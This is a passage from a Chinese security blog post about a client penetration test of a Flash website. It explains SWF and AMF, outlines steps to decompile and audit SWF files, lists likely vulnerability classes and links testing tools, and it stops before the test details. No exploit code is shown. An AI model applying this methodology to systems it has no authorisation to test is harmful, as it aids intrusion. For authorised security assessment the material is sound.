<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>案例-记一次Flash网站渗透测试 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="案例-记一次Flash网站渗透测试,学习了SWF/AMP的渗透测试"><meta name="keywords" content='Pentest, Flash, AMF'>
  <meta itemprop="name" content="案例-记一次Flash网站渗透测试">
  <meta itemprop="description" content="案例-记一次Flash网站渗透测试,学习了SWF/AMP的渗透测试">
  <meta itemprop="datePublished" content="2025-08-16T08:05:53+00:00">
  <meta itemprop="dateModified" content="2025-08-16T08:05:53+00:00">
  <meta itemprop="wordCount" content="8938">
  <meta itemprop="keywords" content="Pentest,Flash,AMF"><meta property="og:url" content="https://www.bthoughts.top/posts/case-flash_swf_amf_test/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="案例-记一次Flash网站渗透测试">
  <meta property="og:description" content="案例-记一次Flash网站渗透测试,学习了SWF/AMP的渗透测试">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-16T08:05:53+00:00">
    <meta property="article:modified_time" content="2025-08-16T08:05:53+00:00">
    <meta property="article:tag" content="Pentest">
    <meta property="article:tag" content="Flash">
    <meta property="article:tag" content="AMF">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="案例-记一次Flash网站渗透测试">
  <meta name="twitter:description" content="案例-记一次Flash网站渗透测试,学习了SWF/AMP的渗透测试">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://www.bthoughts.top/posts/case-flash_swf_amf_test/" title="案例-记一次Flash网站渗透测试 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="https://www.bthoughts.top/posts/aisecurity_math/" title="AI安全-数学基础" /><link rel="alternate" type="text/markdown" href="https://www.bthoughts.top/posts/case-flash_swf_amf_test/index.md" title="案例-记一次Flash网站渗透测试 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "案例-记一次Flash网站渗透测试",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/www.bthoughts.top\/posts\/case-flash_swf_amf_test\/"
    },"genre": "posts","keywords": "Pentest, Flash, AMF","wordcount":  8938 ,
    "url": "https:\/\/www.bthoughts.top\/posts\/case-flash_swf_amf_test\/","datePublished": "2025-08-16T08:05:53+00:00","dateModified": "2025-08-16T08:05:53+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": "案例-记一次Flash网站渗透测试,学习了SWF/AMP的渗透测试"
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>案例-记一次Flash网站渗透测试</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E6%A1%88%E4%BE%8B%E5%88%86%E4%BA%AB/" class="post-category" title="分类 - 案例分享"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 案例分享</a>&ensp;<a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2025-08-16 08:05:53"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-16">2025-08-16</time></span>&nbsp;<span title="8938 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 9000 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 18 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="案例-记一次Flash网站渗透测试"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
          </span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#背景">背景</a></li>
    <li><a href="#flash技术">Flash技术</a>
      <ul>
        <li><a href="#基本组件和协议">基本组件和协议</a></li>
        <li><a href="#actionscript虚拟机">ActionScript虚拟机</a></li>
        <li><a href="#swf文件格式">SWF文件格式</a></li>
        <li><a href="#amf协议">AMF协议</a></li>
      </ul>
    </li>
    <li><a href="#swf渗透">SWF渗透</a>
      <ul>
        <li><a href="#测试工具">测试工具</a></li>
        <li><a href="#测试过程">测试过程</a>
          <ul>
            <li><a href="#1下载swf文件"><strong>1、下载swf文件</strong></a></li>
            <li><a href="#2反编译-swf-文件"><strong>2、反编译 swf 文件</strong></a></li>
            <li><a href="#3代码审计">3、代码审计</a></li>
            <li><a href="#4漏洞验证">4、漏洞验证</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#amf渗透">AMF渗透</a>
      <ul>
        <li><a href="#测试工具-1">测试工具</a></li>
        <li><a href="#实战案例">实战案例</a>
          <ul>
            <li><a href="#未授权sql执行">未授权SQL执行</a>
              <ul>
                <li><a href="#整体结构说明">整体结构说明</a></li>
                <li><a href="#核心内容解析messagebody部分">核心内容解析（<code>&lt;MessageBody&gt;</code>部分）</a></li>
                <li><a href="#该请求的实际含义">该请求的实际含义</a></li>
              </ul>
            </li>
            <li><a href="#反序列化cve-2017-3066">反序列化(CVE-2017-3066)</a></li>
          </ul>
        </li>
        <li><a href="#历史漏洞">历史漏洞</a>
          <ul>
            <li><a href="#xss">XSS</a></li>
            <li><a href="#xxexml注入">XXE&amp;XML注入</a></li>
            <li><a href="#xxecve-2015-3269">XXE(CVE-2015-3269)</a></li>
            <li><a href="#ssrfcve-2015-5255">SSRF(CVE-2015-5255)</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#我的测试日记">我的测试日记</a>
      <ul>
        <li><a href="#flash功能">Flash功能</a></li>
        <li><a href="#正常测试">正常测试</a></li>
        <li><a href="#swf">SWF</a></li>
        <li><a href="#amf">AMF</a></li>
        <li><a href="#事后">事后</a></li>
      </ul>
    </li>
    <li><a href="#参考文献">参考文献</a></li>
    <li><a href="#文件属性">文件属性</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="背景" class="heading-element"><span>背景</span>
  <a href="#%e8%83%8c%e6%99%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在2025年8月的平凡一天，去客户现场进行渗透测试，遇到了一个Flash网站，缘分妙不可言。Flash技术目前已经被淘汰了，关于它的渗透测试技术分享主要集中在2018年之前，近两年也在持续的报出Flash的CVE。</p>
<p>既然遇到了，那就不能白学，把这乱七八糟的东西重新整理下，水一篇文章也还是可以的。参考文章都放在下面，大部分都是英文的，本文中有很多是来自参考文章中的翻译部分。</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>注意</p><p>为了写文章，查了大量资料去了解相关知识。我在事后查阅资料时，在wooyun drops中发现了大量相关文章，那都是12、13年的东西，没想到还能用上。</p>
<p>我不想为这个过时的，少见的场景花费太多时间，所以很多地方可能都不到位，请大家谅解。</p></div><p>先讲测试结果
网站基于Flash技术，存在大量 swf 文件，数据交互使用 amf 进行传输。本次涉及的漏洞有：</p>
<ul>
<li>SQL注入</li>
<li>未授权</li>
<li>信息泄露</li>
<li>反序列化（疑似）</li>
</ul>
<h2 id="flash技术" class="heading-element"><span>Flash技术</span>
  <a href="#flash%e6%8a%80%e6%9c%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>Flash是一种基于矢量图形的交互式多媒体技术，本身是从Future Splash发展起来的。后被Macromedia公司收购并继续发展其制作动画丰富多采，富于变化性并且相对于其他作图软件文件较小，在网页中无须等它下载完毕就可以显示出来并以流的形式播放，唯一的缺点是需要特定的浏览器插件来支持，目前所有的浏览器都支持Flash，或者说都可以安装Flash的播放器插件。</p>
<p>Flash包括运行时（虚拟机或者叫播放器），播放文件（SWF），商标，创作工具等诸多意思，ActionScript系FlashPlayer中可以使用的编程语言，也是唯一的编程语言。现在的版本是AS3，性能较以前的AS2有很大提高，而且，语言本身抽象得更像一门编程语言。</p>
</blockquote>
<p>Flash是一个广泛应用于网页动画、游戏开发和移动应用开发的平台，依赖于ActionScript编程语言和Flash Player。ActionScript是一种基于ECMAScript的面向对象编程语言，专门用于开发Flash内容。 文件后缀为 as，和 JavaScript有点像</p>
<p>Flash的安全机制是其架构中最为关键的组成部分之一，它旨在为用户提供一个安全稳定的运行环境。在Flash中，安全机制的理论基础建立在以下几个核心概念上：</p>
<ul>
<li>
<p>沙盒模型（Sandbox Model） ：为Flash应用（尤其是来自不同源的应用）提供了隔离的运行环境，限制了应用对本地系统资源的访问，确保了不同应用之间的独立性和安全性。</p>
</li>
<li>
<p>策略文件（Policy Files） ：用于控制应用程序的网络访问权限。策略文件定义了哪些域可以与Flash应用通信，从而限定了应用的网络访问范围。</p>
</li>
<li>
<p>安全证书（Certificates） ：用于验证应用的可信性，确保了Flash应用的来源可靠，防止恶意软件的攻击。</p>
</li>
</ul>
<h3 id="基本组件和协议" class="heading-element"><span>基本组件和协议</span>
  <a href="#%e5%9f%ba%e6%9c%ac%e7%bb%84%e4%bb%b6%e5%92%8c%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h3 id="actionscript虚拟机" class="heading-element"><span>ActionScript虚拟机</span>
  <a href="#actionscript%e8%99%9a%e6%8b%9f%e6%9c%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>ActionScript虚拟机是Flash平台上的一个关键组件，它负责解释和执行ActionScript代码。ActionScript是一种基于ECMAScript的
编程语言，专为Flash环境设计，提供了丰富的事件处理、面向对象编程和网络功能。</p>
<p>ActionScript虚拟机的机制主要包括以下几个方面：</p>
<ul>
<li>字节码解释执行：ActionScript代码首先被编译成字节码，虚拟机通过解释器逐行读取并执行这些字节码。</li>
<li>即时编译（JIT）技术：在Flash Player的较新版本中引入，可将经常执行的代码段编译为更高效的本地机器码，减少解释执行
的开销，提高性能。</li>
<li>垃圾回收机制：自动管理内存，定期清理不再使用的对象，防止内存泄漏。</li>
</ul>
<h3 id="swf文件格式" class="heading-element"><span>SWF文件格式</span>
  <a href="#swf%e6%96%87%e4%bb%b6%e6%a0%bc%e5%bc%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>SWF 文件格式，是 Adobe Flash Player 所使用的文件格式，广泛应用于网络动画和富媒体内容的展示。动态加载SWF 文件意味着在运行时从服务器下载并展示Flash内容，这对于减少初始加载时间和提供模块化内容至关重要。</p>
<p>SWF文件从一个16字节的文件头开始，包含了关于文件的元数据，比如版本信息、帧尺寸、帧频和帧数。紧随其后的是一系列标记（Tag），这些标记定义了SWF文件的其余部分，如定义形状、文本、位图、声音以及动作脚本代码。</p>
<h3 id="amf协议" class="heading-element"><span>AMF协议</span>
  <a href="#amf%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>AMF（Action Message Format）是一种二进制的数据格式，即数据（actionscript里面的Object, Array, Boolean, Number等）经过了序列化成二进制。</p>
<ul>
<li>AMF 是 Adobe 提出的二进制序列化协议</li>
<li>主要用于 Flash/Flex 和服务器间高效传输数据</li>
<li>支持复杂对象、数组、XML、日期等数据类型</li>
</ul>
<p>有amf0和amf3，当数据流中有0×11标记时，表示这个数据属于AMF3。</p>
<p>AMF基于HTTP协议，大致处理过程：<br>
获取客户端请求（request） - 服务端反序列化请求 - 处理请求 - 序列化响应（response） - 返回http响应给客户端</p>
<p>相关工具和库</p>
<ul>
<li>Adobe Flex SDK</li>
<li>Java的 BlazeDS</li>
<li>PHP的 AMFPHP</li>
</ul>
<h2 id="swf渗透" class="heading-element"><span>SWF渗透</span>
  <a href="#swf%e6%b8%97%e9%80%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>以下是我找到的一些参考文章：</p>
<ul>
<li><a href="https://xz.aliyun.com/news/3051"target="_blank" rel="external nofollow noopener noreferrer">探寻Flash SWF中的漏洞</a> —— 先知的翻译文，原文：http://10degres.net/testing-flash-swf/</li>
<li><a href="https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/"target="_blank" rel="external nofollow noopener noreferrer">Analysing SWF files for vulnerabilities</a></li>
<li><a href="http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf"target="_blank" rel="external nofollow noopener noreferrer">Finding vulnerabilities in SWF files (v2.0)</a></li>
<li><a href="https://cn-sec.com/archives/321701.html"target="_blank" rel="external nofollow noopener noreferrer">一次 SWF XSS 挖掘和利用</a>， 乌云 drops</li>
</ul>
<p>对于SWF文件的渗透测试，我总结为以下步骤：</p>
<ol>
<li>下载swf文件并保存；</li>
<li>反编译SWF文件，并导出</li>
<li>对导出后的 actionScript 代码进行代码审计</li>
<li>验证漏洞是否可利用</li>
</ol>
<p>可能存在的漏洞：</p>
<ul>
<li>Cross-site scripting ，XSS攻击</li>
<li>Cross-site data hijacking (XSDH?) ，跨站数据劫持</li>
<li>Same Origin Method Execution (SOME)  ，同源方式执行攻击</li>
<li>Open redirections，开放重定向</li>
<li>Information disclosure，信息泄露，如用户密码凭据、隐藏的url等</li>
<li>Spoofing/Defacement via loading remote objects ，加载远程对象进行欺诈伪造，我理解类似CSRF那种</li>
<li>Log forging，日志伪造攻击（大多数情况下不太重要）</li>
</ul>
<h3 id="测试工具" class="heading-element"><span>测试工具</span>
  <a href="#%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li><a href="https://github.com/jindrapetrik/jpexs-decompiler"target="_blank" rel="external nofollow noopener noreferrer">ffdec: JPEXS Free Flash Decompiler</a>： 一个免费开源的 .SWF 反编译软件，在Windows、Linux、Mac上都能用，需要 Java 8或更高版本环境。用于反编译SWF文件，读取源代码并将其完全导出，更多内容见 <a href="https://github.com/jindrapetrik/jpexs-decompiler/wiki"target="_blank" rel="external nofollow noopener noreferrer">wiki文档</a>；</li>
<li><a href="https://www.flash.cn/download"target="_blank" rel="external nofollow noopener noreferrer">Flash Player</a>： Flash播放器，需在JPEXS中配置。</li>
<li><a href="https://www.flash.cn/support/debug-downloads"target="_blank" rel="external nofollow noopener noreferrer">Flash Player 调试器</a>：Flash播放器的debug版本，需在JPEXS中配置。</li>
</ul>
<p>上面讲的都是Windows环境下的，如果要在Linux和MAC环境，可以去以下几个地方下载</p>
<ul>
<li><a href="https://github.com/Grubsic/Adobe-Flash-Player-Debug-Downloads-Archive"target="_blank" rel="external nofollow noopener noreferrer">github备份库</a></li>
<li><a href="https://web.archive.org/web/20220401020702/https://www.adobe.com/support/flashplayer/debug_downloads.html"target="_blank" rel="external nofollow noopener noreferrer">Adobe Flash Player Support Center</a></li>
</ul>
<h3 id="测试过程" class="heading-element"><span>测试过程</span>
  <a href="#%e6%b5%8b%e8%af%95%e8%bf%87%e7%a8%8b" class="heading-mark">
